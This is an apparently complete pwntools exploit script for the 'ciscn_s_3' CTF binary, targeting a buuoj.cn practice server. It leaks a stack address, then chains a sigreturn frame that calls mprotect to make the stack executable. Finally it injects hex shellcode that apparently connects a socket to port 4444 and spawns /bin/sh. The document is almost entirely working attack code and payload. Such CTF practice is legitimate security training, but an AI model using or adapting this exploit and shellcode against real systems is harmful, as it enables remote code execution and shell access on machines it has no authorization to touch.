from pwn import *
from time import *
context.binary = './ciscn_s_3'
context.log_level = 'debug'
context.timeout = None
elf = context.binary



def dbg():
	raw_input()

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20154)
	libc = ELF('../x64_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./ciscn_s_3')
	#gdb.attach(p, 'b* 0x4004DA ')
	dbg()


main = 0x4004F1
syscall = 0x400517 			#syscall; ret
rt_sigreturn = 0x4004DA 		#mov eax, 0xf; ret
		
payload = '\x00' * 0x10
payload += p64(main)
p.send(payload)					#write(1, stack_addr, 0x30)
								#will leak an address on stack
p.recv(32)

stack_addr = u64(p.recv(8)) - 0x118	#rsi
print "stack_addr ==> " + hex(stack_addr)
p.recv(8)


frame1 = SigreturnFrame()				
frame1.rax = constants.SYS_mprotect
frame1.rdi = stack_addr & 0xFFFFFFFFFFFFF000
frame1.rsi = 0x1000							
frame1.rdx = 7							
frame1.rsp = stack_addr + 0x120		#frame2_sigreturn
frame1.rip = syscall


shellcode =  "\x6a\x29\x58\x6a\x02\x5f\x6a\x01" \
		 	"\x5e\x48\x31\xd2\x0f\x05\x48\x97" \
		 "\x6a\x02\x66\xc7\x44\x24\x02\x11" \
		 "\x5c\x54\x6a\x2a\x58\x5e\x6a\x10" \
		 "\x5a\x0f\x05\x6a\x03\x5e\x6a\x21" \
		 "\x58\x48\xff\xce\x0f\x05\xe0\xf6" \
		 "\x48\x31\xf6\x56\x48\xbf\x2f\x62" \
		 "\x69\x6e\x2f\x2f\x73\x68\x57\x54" \
		 "\x5f\xb0\x3b\x99\x0f\x05"

payload = '\x00'*0x10 					#rop_chain  stack_addr+8
payload += p64(rt_sigreturn)
payload += p64(syscall)					#sigreturn
payload += str(frame1)
payload += p64(stack_addr + 0x128)
payload += shellcode

print "length ==> " + hex(len(payload))

p.send(payload)
p.interactive()
#p.close()		





